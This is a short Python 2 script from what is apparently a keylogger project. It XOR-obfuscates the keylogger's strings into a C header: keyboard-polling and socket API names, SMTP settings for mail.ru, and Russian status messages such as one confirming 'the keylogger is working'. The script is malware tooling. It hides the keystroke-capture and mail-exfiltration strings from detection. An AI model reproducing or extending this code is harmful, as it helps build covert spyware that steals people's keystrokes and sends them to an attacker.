#-*- coding: cp1251 -*-

key = 0x2B
Strings=[
   "user32.dll",
   "GetAsyncKeyState",
   "GetKeyState",
   "",
   "wininet.dll",
   "InternetGetConnectedState",
   "",
   "wsock32.dll",
   "WSAStartup",
   "socket",
   "htons",
   "gethostbyname",
   "connect",
   "recv",
   "send",
   "closesocket",
   "",
   "Keylogger Detective",
   "",
]

NamesAndStrings=[
   ["csMailServer", "smtp.mail.ru"],
   ["csMail", "login@mail.ru"],
   ["csMailPass", "Password"],
   ["", ""],
   ["csTestMessage", "Тестовое сообщение. Если ты читаешь этот текст, значит кейлоггер работает.\r\n"],
   ["csNoConnect", "Пожалуйста подключи интернет."],
   ["csErrorAuthorization", "Не удалось авторизоваться! Проверь E-Mail и пароль."],
   ["csNoSendMessage", "Тестовое сообщение не отправлено! Попробуй снова или измени E-Mail и пароль."],
   ["csGoodTest", "Тестовое сообщение отправлено!"],
]

def generateName(String):
   Name = ''
   Name += String[0].upper()
   Name += String[1:].replace('.', '_')
   Name = Name.replace(',', '_')
   ln = Name.split(' ')
   Name = ''
   for n in ln:
      Name += n[0].upper()
      Name += n[1:]
   return Name

def cryptoString(String):
   str = "{"
   ckey = 0
   for char in String:
      ckey+=key
      char = ord(char)^ckey
      #str += chr(char&0xFF)
      str += "0x%02X, " % (char&0xFF)
   ckey+=key
   char = 0^ckey
   str += "0x%02X}" % (char&0xFF)
   return str

list = []
for String in Strings:
   if String == "":
      print ""
      list.append("")
   else:
      print "BYTE cs"+generateName(String)+"[] = "+cryptoString(String)+";"
      list.append("BYTE cs"+generateName(String)+"[] = "+cryptoString(String)+";")

for Name, String in NamesAndStrings:
   if String == "":
      print ""
      list.append("")
   else:
      print "BYTE "+Name+"[] = "+cryptoString(String)+";"
      list.append("BYTE "+Name+"[] = "+cryptoString(String)+";")

file = open("cryptedstrings.h", 'w+b')
try:
   file.write("#include <windows.h>\r\n\r\n");
   for String in list:
      file.write(String+"\r\n");
finally:
	file.close()
